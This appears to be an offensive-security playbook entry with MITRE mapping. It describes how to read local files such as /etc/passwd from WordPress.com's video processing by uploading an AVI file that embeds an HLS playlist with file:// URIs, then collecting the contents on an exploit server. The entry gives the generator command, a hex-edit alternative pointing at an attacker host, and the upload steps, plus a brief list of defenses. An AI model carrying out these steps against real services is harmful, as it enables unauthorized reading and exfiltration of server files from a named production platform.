---
id: proc-file-disclosure-001
tags:
  - local-file-read
  - file-uri
  - exfiltration
type: procedure
tools:
  - '[[tools/Hex-Editor]]'
  - '[[tools/gen_avi.py]]'
  - '[[tools/file_reading_server.py]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/generate-avi-with-file-uri]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T03:46:09.409Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Execute-Local-File-Disclosure-via-AVI

## Summary

This procedure modifies an AVI file to include an HLS playlist with file:// URIs pointing to local files, uploads it to trigger processing, and uses the exploit server to exfiltrate the contents via SSRF-induced concatenation.

## Description

Building on SSRF, the HLS playlist references file:// URIs (e.g., file:///etc/passwd) alongside an initial HTTP segment. FFmpeg fetches and concatenates all into a text file, which the server reconstructs and saves. Targets sensitive files on video nodes; also applicable to other Automattic services like Cloudup.com.

## Requirements

1. Running exploit server from prior procedure
2. Base AVI file
3. Paid WordPress.com account

## Defense

Defensive measures and detection strategies:

- Disable or sandbox FFmpeg file:// access
- Validate HLS playlists for protocol restrictions
- Audit uploaded media for embedded URIs

## Objectives

1. Embed file:// in HLS via AVI modification
2. Trigger processing and SSRF
3. Retrieve and verify exfiltrated file contents

## Instructions

### Step 1: Modify AVI for File URI

**Context**: Embed the exploit URL with filename parameter or use gen_avi.py for file://.

**Command** ([[commands/generate-avi-with-file-uri]]):
```bash
python3 gen_avi.py file:///etc/passwd output.avi
```

> Generates AVI with HLS like #EXTM3U ... file:///etc/passwd; alternatively, hex edit to set http://ip:8080/initial.m3u?filename=/etc/passwd.

### Step 2: Upload and Process

**Context**: Upload to WordPress.com and edit to trigger.

No command; follow upload steps; server receives requests and outputs file.

> Check server directory for <random_string>_etc_passwd containing file contents.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used

- [[commands/generate-avi-with-file-uri]]

## Tools Used

- [[tools/gen_avi.py]]
- [[tools/file_reading_server.py]]
- [[tools/Hex-Editor]]

## Tags

- file-disclosure
- uri-exploit
